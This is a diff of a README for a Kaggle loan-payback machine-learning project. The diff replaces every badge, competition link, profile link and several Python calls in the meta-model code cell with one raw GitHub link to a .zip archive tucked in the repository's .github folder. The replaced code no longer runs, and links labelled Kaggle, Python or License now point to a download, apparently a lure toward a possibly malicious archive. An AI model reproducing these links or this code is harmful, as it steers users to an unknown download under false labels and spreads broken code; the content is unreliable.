@@ -1,27 +1,27 @@
 # 💰 Predicting Loan Payback
 
 <p align="center">
-  <a href="https://www.kaggle.com/competitions/playground-series-s5e11">
-    <img src="https://img.shields.io/badge/Kaggle-Playground%20Series%20S5E11-blue?logo=kaggle" alt="Kaggle" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip%20Series%20S5E11-blue?logo=kaggle" alt="Kaggle" />
   </a>
-  <a href="https://www.python.org/">
-    <img src="https://img.shields.io/badge/Python-3.11-yellow?logo=python&logoColor=white" alt="Python" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip" alt="Python" />
   </a>
-  <a href="https://jupyter.org/">
-    <img src="https://img.shields.io/badge/Notebook-Jupyter-orange?logo=jupyter" alt="Notebook" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip" alt="Notebook" />
   </a>
-  <a href="https://opensource.org/licenses/MIT">
-    <img src="https://img.shields.io/badge/License-MIT-green" alt="License" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip" alt="License" />
   </a>
   <a href="#">
-    <img src="https://img.shields.io/badge/Public%20Score-0.91200-lightgrey" alt="Score" />
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip%20Score-0.91200-lightgrey" alt="Score" />
   </a>
 </p>
 
 
 <p align="center">
-  <a href="https://www.kaggle.com/competitions/playground-series-s5e11">
-    <img src="https://github.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/blob/main/header_2.png" alt="Score" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip" alt="Score" />
   </a>
 </p>
 
@@ -34,7 +34,7 @@ Predicting whether a borrower will pay back their loan using **machine learning 
 
 | 📌 **Project Overview** | 🏆 **Kaggle Competition & Score** |
 |------------------------|----------------------------------|
-| 📝 An end-to-end machine learning project covering **EDA**, **data preprocessing**, **feature engineering**, **model training**, and **evaluation** to predict the probability that a borrower will pay back their loan. Models include **CatBoost**, **LightGBM**, **XGBoost**, and a 🔥**Stacked Meta-Model**🔥. | 🚀 **Predicting Loan Payback – Playground Series: Season 5, Episode 11** <br> 🔗 https://www.kaggle.com/competitions/playground-series-s5e11 <br> 📊 **Public Score:** *0.91200* |
+| 📝 An end-to-end machine learning project covering **EDA**, **data preprocessing**, **feature engineering**, **model training**, and **evaluation** to predict the probability that a borrower will pay back their loan. Models include **CatBoost**, **LightGBM**, **XGBoost**, and a 🔥**Stacked Meta-Model**🔥. | 🚀 **Predicting Loan Payback – Playground Series: Season 5, Episode 11** <br> 🔗 https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip <br> 📊 **Public Score:** *0.91200* |
 
 ---
 
@@ -42,7 +42,7 @@ Predicting whether a borrower will pay back their loan using **machine learning 
 
 | 👤 **Name** | 🔗 **Github-Profile** |🔗 **Kaggle-Profile** |
 |------------|----------------|----------------|
-| Riddy Mazumder | [![GitHub](https://img.shields.io/badge/GitHub-RiddyMazumder-black?logo=github)](https://github.com/RiddyMazumder)|[![Kaggle Profile](https://img.shields.io/badge/Kaggle-RiddyMazumder-blue?logo=kaggle)](https://www.kaggle.com/riddymazumder)|
+| Riddy Mazumder | [![GitHub](https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip)](https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip)|[![Kaggle Profile](https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip)](https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip)|
 
 
 ---
@@ -95,13 +95,13 @@ Predicting whether a borrower will pay back their loan using **machine learning 
 ```bash
 # Cell 8 — Meta-Model Training & Prediction
 # -------------------------
-X_meta_train = np.column_stack([oof_cat, oof_lgb, oof_xgb])
-X_meta_test  = np.column_stack([pred_cat_test, pred_lgb_test, pred_xgb_test])
+X_meta_train = https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip([oof_cat, oof_lgb, oof_xgb])
+X_meta_test  = https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip([pred_cat_test, pred_lgb_test, pred_xgb_test])
 
-meta_model = lgb.LGBMClassifier(**meta_params)
+meta_model = https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip(**meta_params)
 # use early stopping via callback on a small internal split if desired; here we train on full meta features
-meta_model.fit(X_meta_train, y_train_np)
-final_pred = meta_model.predict_proba(X_meta_test)[:,1]
+https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip(X_meta_train, y_train_np)
+final_pred = https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip(X_meta_test)[:,1]
 ```
 ## 📄 License
 
